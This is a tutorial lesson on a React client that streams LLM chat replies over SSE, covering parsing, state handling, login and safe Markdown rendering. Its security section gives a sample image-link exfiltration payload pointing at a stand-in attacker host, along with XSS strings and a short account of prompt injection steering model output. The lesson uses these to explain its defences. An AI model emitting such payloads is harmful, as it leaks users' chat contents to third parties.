---
title: The React client: reading the stream
level: medium
time: 50 min
summary: How the browser reads an SSE stream with fetch, why chunks are not events, how the chat state machine handles the happy and unhappy paths, and how untrusted Markdown is rendered safely.
tags: React, TypeScript, fetch, ReadableStream, AbortController, optimistic UI, Markdown, XSS
---

The server is only half of streaming. The browser has to *read* a response that never finishes, turn its bytes into events, update the screen on every word, let the user stop it, and render the model's untrusted output safely. That is the React client.

## What the client is responsible for

| Job | Where |
|---|---|
| read the byte stream and rebuild SSE events | `api.ts`, `sse.ts` |
| keep the chat state: messages, totals, banners | `Chat.tsx` |
| show a reply while it streams, and render it properly when it ends | `Message.tsx` |
| keep the login: token storage, "who am I", sign out on 401 | `auth.ts`, `AuthContext.tsx`, `Login.tsx` |
| attach files, show their indexing status, show document citations | `Chat.tsx`, `documents.ts`, `Message.tsx` |
| keep the URL, the sidebar and drafts in sync | `App.tsx` |
| draw the Usage page | `Usage.tsx`, `chart.ts` |

## Step 1: read the response as a stream

The browser's `fetch` returns a `Response` whose `body` is a **`ReadableStream`**: you can read it piece by piece while the server is still writing.

```ts src="frontend/src/api.ts" fn="streamMessage"
```

Three things deserve attention.

**1. Bytes are not text.** `res.body` yields raw bytes. One character, such as an emoji, accent or Hindi letter, can be several bytes in UTF-8, and the network may cut *between* them. `TextDecoderStream` remembers the partial bytes between chunks and emits only whole characters. See the corruption you avoid:

```python run title="Why decoding must be incremental" level=easy
import codecs

text = "नमस्ते 👋 hello"
data = text.encode("utf-8")
chunk1, chunk2 = data[:4], data[4:]          # the network cut in the middle of a character

print("naive, chunk by chunk :", chunk1.decode("utf-8", errors="replace") + chunk2.decode("utf-8", errors="replace"))

decoder = codecs.getincrementaldecoder("utf-8")()     # what TextDecoderStream does
print("incremental decoder   :", decoder.decode(chunk1) + decoder.decode(chunk2))
```

**2. Chunks are not events.** TCP guarantees order, not boundaries. One network chunk can hold several events, or half of one. The parser must *buffer*.

**3. A stream must end with a terminal event.** If the connection closes without a `done` or `error` event (the server died, the Wi-Fi dropped), `streamMessage` throws `StreamInterrupted`. Treating a silent end as success would show a truncated answer as if it were whole.

## Step 2: chunks are not events

Imagine the server wrote `event: delta\ndata: {"text":"Hello"}\n\n` as one unit. The network may deliver it as:

```text
chunk 1:  event: delta\ndata: {"text":"Hel
chunk 2:  lo"}\n\n
```

`JSON.parse` on chunk 1 would throw. The fix is the heart of `sse.ts`: keep a **buffer**, and only emit an event once its blank-line terminator has arrived.

```ts src="frontend/src/sse.ts" fn="SSEParser,parseBlock"
```

`push()` appends the chunk, splits off every complete block (ending in `\n\n`), parses each one, and **leaves the incomplete tail in the buffer** for the next chunk. It also normalises `\r\n`, re-normalising the *whole buffer* because a `\r` and its `\n` can arrive in different chunks. Here is the same algorithm in Python, so you can feed it awkward slicings:

```python run title="The SSE parser's buffering idea (a Python port of sse.ts)" level=medium
import json

class SSEParser:
    def __init__(self):
        self.buffer = ""

    def push(self, chunk):
        self.buffer = (self.buffer + chunk).replace("\r\n", "\n")
        events = []
        while (end := self.buffer.find("\n\n")) != -1:
            block, self.buffer = self.buffer[:end], self.buffer[end + 2:]
            event, data = "message", []
            for line in block.split("\n"):
                if line == "" or line.startswith(":"):
                    continue                                  # blank line or keep-alive comment
                field, _, value = line.partition(":")
                value = value[1:] if value.startswith(" ") else value
                if field == "event": event = value
                elif field == "data": data.append(value)
            if data:
                events.append((event, "\n".join(data)))
        return events

wire = 'event: delta\ndata: {"text": "Hello "}\n\nevent: delta\ndata: {"text": "world"}\n\nevent: done\ndata: {}\n\n'

def feed(slices):
    parser, out = SSEParser(), []
    for piece in slices:
        out += parser.push(piece)
    return [(e, json.loads(d)) for e, d in out]

# the same bytes, sliced three different ways, give the same events:
print(feed([wire]))                                            # one big chunk
print(feed([wire[:30], wire[30:75], wire[75:]]))               # cut in the middle of events
print(feed(list(wire)))                                        # one CHARACTER at a time
assert feed([wire]) == feed(list(wire))
```

This is why the TypeScript test-suite includes tests that feed the parser one character at a time.

## Step 3: typed events and handlers

Each SSE event name maps to a typed handler, so the compiler checks that the UI handles every event correctly:

```ts src="frontend/src/types.ts" fn="StreamHandlers"
```

Unknown event types are *ignored on purpose*: the server can add a new event (as it did for `tool_call`) without breaking older clients.

## Step 4: the chat state machine

`Chat.tsx` is where events become pixels. The cleverness is in the ordering and in the unhappy paths.

### Optimistic UI

When you press Enter, the screen does not wait for the server. It adds your message and an empty assistant bubble **immediately**, then reconciles when the server answers:

```tsx src="frontend/src/Chat.tsx" from='const tmpUser = tempMessage("user", text);' to="abortRef.current = controller;"
```

The messages start with temporary ids. The first SSE event (`start`) carries the **real** database ids, and the placeholders are renamed:

```tsx src="frontend/src/Chat.tsx" from="onStart: (e) => {" to="setHistorySummarized(e.history_summarized);"
```

Read the comment in that snippet. It records a real bug: React runs state updaters *later*, after `assistantId` was already reassigned, so reading the variable inside the updater compared against the **new** id and never renamed the placeholder; every later delta then matched no message and nothing appeared. The fix is to capture the **old** id first. Closures and asynchronous updates are the classic React trap.

After that, each `delta` is one line, appending to the last message's content:

```tsx
onDelta: (e) => patchAssistant((m) => ({ content: m.content + e.text })),
```

### Stop

```tsx src="frontend/src/Chat.tsx" from="// STOP: abort()" to="const stop = () => abortRef.current?.abort();"
```

`AbortController` is the browser's cancellation switch. Calling `abort()` makes the pending `fetch` reject **and closes the underlying connection**, which is what the server notices (see the streaming lesson). Navigating to another chat does the same, so you never burn tokens for a screen nobody is looking at.

### When it goes wrong

There are three different failures, and they need three different responses:

```tsx src="frontend/src/Chat.tsx" from="const started = assistantId !== tmpAssistant.id;" to="window.setTimeout(() => !abortRef.current && void reload(), 800);"
```

| Situation | What happened | What the UI does |
|---|---|---|
| **You pressed Stop** (an `AbortError`) | the server saved the partial text | mark the reply "Stopped", keep the text |
| **Rejected before streaming** (413 too long, 429, server down) | nothing was saved server-side | **roll back** the optimistic messages and **give your text back** in the box, with a banner |
| **The connection died mid-stream** | no `error` event arrived | mark the reply as errored ("The connection was lost") and keep the partial text |

Afterwards it re-syncs with the database shortly, because the server records how the reply *really* ended.

## Drafts, and a new chat on launch

Opening the app starts a **new chat**, like ChatGPT, but without filling your sidebar with empty chats. A "New chat" is only a draft in the browser; nothing exists on the server until you send the first message *or attach the first file*:

```tsx src="frontend/src/Chat.tsx" fn="ensureConversation"
```

Both `send()` and `attach()` call this, so the "create it on first use" rule lives in one place. Note `idRef`, a `useRef`, rather than state. The id changes *while a stream is running*. Changing state would re-run effects and remount the component, which would abort the very reply being started. A ref changes without re-rendering.

The selected chat lives in the URL hash (`#/c/<id>`), so refresh, bookmarks and the back button all work. But a *fresh launch* should open a new chat even if the address still carries an old id, while a *refresh* should keep the chat. `sessionStorage` lives exactly as long as a tab, which is the difference:

```tsx src="frontend/src/App.tsx" from="(function startNewChatOnLaunch() {" to="})();"
```

## Login in the browser

Every request now needs a token, so the client has a small login layer. `api.ts` wraps `fetch` so the token is attached in one place, and a `401` anywhere means "your login no longer works":

```ts src="frontend/src/api.ts" fn="authHeaders,authedFetch"
```

`AuthContext` is a tiny state machine (`checking` · `anonymous` · `authenticated` · `unreachable`) that decides whether to show the login screen or the app:

```tsx src="frontend/src/AuthContext.tsx" fn="verify"
```

- The token lives in `localStorage`, wrapped in `try/catch` because storage can be blocked. It survives a refresh, which is why you stay signed in.
- The client reads the token's `exp` *without verifying it* (`auth.ts`), only to avoid sending a request it knows will be refused. Only the server can verify the signature.
- `unreachable` is deliberately different from `anonymous`: if the server is down, the user is **not** logged out.
- On logout the URL hash is cleared, so the next person does not land on the previous person's chat address.

:::warn The localStorage trade-off
A script running in the page could read the token (cross-site scripting). That is the usual trade-off of this MERN-style approach, and the reason the next section matters so much: model output is rendered without raw HTML or images. An `httpOnly` cookie is the stricter alternative.
:::

## Attachments in the browser

Files are attached from the paperclip button or by **dragging them onto the chat**. Indexing happens in the background on the server, so the client treats each file as something with a *status*:

```tsx src="frontend/src/Chat.tsx" fn="attach"
```

The chip next to the composer shows `Indexing` while the file is `processing`, then `Ready` (with the page count) or the safe failure reason. A small effect polls the list while anything is still processing, and stops by itself afterwards:

```tsx src="frontend/src/Chat.tsx" from="// The attached files." to="}, [indexing, refreshDocuments]);"
```

Details worth noticing:

- **Pure helpers are separate and tested.** `documents.ts` holds the file-type check, the list update and the status text, so they are unit tested without rendering anything.
- **The client check is only a courtesy.** It saves a round trip for an obviously wrong file; the server re-checks everything (extension, real content, size).
- **Drag and drop counts.** `dragenter`/`dragleave` fire for every child element, so a counter decides when the "Drop files to attach" overlay disappears; the handler only reacts to real *file* drags, not selected text.
- **Optimistic removal.** Removing a file hides its chip at once and puts it back if the server refuses.

```ts src="frontend/src/documents.ts" fn="checkFile,upsertDocument"
```

A reply that used your files shows a **document source card** instead of a link: the file name, the page, and a click-to-expand view of the exact passage the answer relied on. Citation chips for documents are not links (a passage has no address); hovering one names the file and page.

## Step 5: rendering untrusted output

While a reply is streaming, the text is shown as **plain text with a blinking cursor**. Why not render Markdown on every token? A half-received document is often invalid Markdown: an opening code fence with no closing fence swallows everything after it as code; `**bo` has no closing marker; a table is cut mid-row. Re-parsing on every token makes the layout jump and flicker. So Markdown is rendered **once, when the reply is complete**.

:::flow From the model's text to the screen
Normalise | `normalizeMath`: turn `\( … \)` and `\[ … \]` into `$$ … $$`, skipping code
Cite | `linkCitations`: turn `[1]` into links to real sources
Parse | react-markdown with remark-gfm (tables) and remark-math
Render | KaTeX for equations, highlight.js for code, a Copy button on each code block
Defend | no raw HTML, no images, safe links
:::

```tsx src="frontend/src/Message.tsx" fn="SafeMarkdown"
```

This component is a security boundary. **LLM output is untrusted input.** It can be steered by whatever the model read, including a malicious document or web page (prompt injection). So:

- `react-markdown` builds React elements and **never uses `dangerouslySetInnerHTML`**. Raw HTML in the text (`<script>`, `<img onerror=…>`) is shown as inert text, because `rehype-raw` is deliberately *not* enabled.
- Its default URL transform strips dangerous schemes such as `javascript:`.
- **Images are removed** (`disallowedElements={["img"]}`). A rendered `![](https://attacker/?q=<secret>)` would make the *browser* send a request to the attacker, a known way to exfiltrate chat contents.
- Links open in a new tab with `rel="noopener noreferrer"`.

The equations come in as `\( … \)` and `\[ … \]`, which Markdown treats as escapes. A small function rewrites them, taking care not to touch code:

```ts src="frontend/src/math.ts" fn="normalizeMath"
```

`singleDollarTextMath` is **off**, so "it cost $5 and $6" stays text rather than becoming an equation. And each code block gets a language label and a Copy button:

```tsx src="frontend/src/Message.tsx" fn="CodeBlock"
```

## Smaller details that make it feel right

- **Auto-scroll that respects you.** It follows the stream only while you are at the bottom; if you scroll up to read, it stops, and a "Latest" button appears.
- **A composer that grows** with your text, `Enter` to send, `Shift+Enter` for a new line, `Esc` to stop.
- **The sidebar groups chats** by Today, Yesterday and so on, with a search box once you have a few chats.
- **Deleting needs an inline confirmation**, not a browser popup.
- **Everything animates less** if you prefer reduced motion.

:::keypoints
- `fetch` returns a **`ReadableStream`**; bytes go through `TextDecoderStream`, then a **buffering `SSEParser`**, then typed **handlers**.
- **Chunks are not events**: buffer until the blank line, and keep the incomplete tail.
- A stream must end with a **terminal event**; otherwise it is an error.
- **Optimistic UI** adds your message instantly, then swaps temporary ids for real ones from the `start` event. Beware closures over changing variables.
- **Stop** is an `AbortController`; unmounting a chat aborts its stream too.
- Three failures, three responses: **stopped** (keep text), **rejected before start** (roll back, restore your text), **dropped mid-stream** (mark an error, keep text).
- **Drafts** exist only in the browser until the first message or attachment; use a **ref** for values that must change without re-rendering.
- **Login** is one wrapper (`authedFetch`) and one state machine; a `401` anywhere signs you out once. The token lives in `localStorage` (a known XSS trade-off).
- **Attachments** are statuses, not instant: upload returns at once, then the list is **polled** until each file is `ready` or `failed`.
- Render Markdown **once complete**, and treat the output as **untrusted**: no raw HTML, no images, safe links.
:::

:::exercise Slice it differently
In the Python SSE parser demo, feed the wire text in chunks of 7 characters. Then try making a chunk boundary fall *inside* the `\n\n` terminator. Does the output change? Why or why not?
:::

:::solution Show the answer
The output never changes. If a boundary falls between the two newlines, the first chunk leaves `...}\n` in the buffer; the next chunk starts with the second `\n`, so the buffer now contains `\n\n` and the event is emitted then. Nothing is lost because the parser only emits an event when it sees the terminator in the buffer, regardless of how the bytes were sliced.
:::

```quiz
? Why is the incoming stream passed through TextDecoderStream?
- To compress it.
+ A character can span several bytes, and the network may split between them; the decoder remembers partial bytes.
- To parse JSON.
> Decoding each chunk independently would corrupt emoji, accents and non-Latin text.

? The connection closes with no `done` or `error` event. What does streamMessage do?
- Treats it as a normal finish.
+ Throws StreamInterrupted, so the UI shows an error instead of presenting a truncated answer as complete.
- Retries the request.
> A silent end is never assumed to be success.

? An attached file shows "Indexing". What is the browser doing?
- Waiting for the model to answer.
+ Polling the document list until the background indexing finishes (ready or failed).
- Uploading the file again.
> Upload returns immediately with status "processing"; the work continues on the server.

? Why is a ref (idRef) used for the new chat's id instead of state?
- Refs are faster.
+ The id changes while a stream is running; a state change would re-render and could abort the very reply being started.
- Refs persist across page loads.
> A ref changes without re-rendering.
```
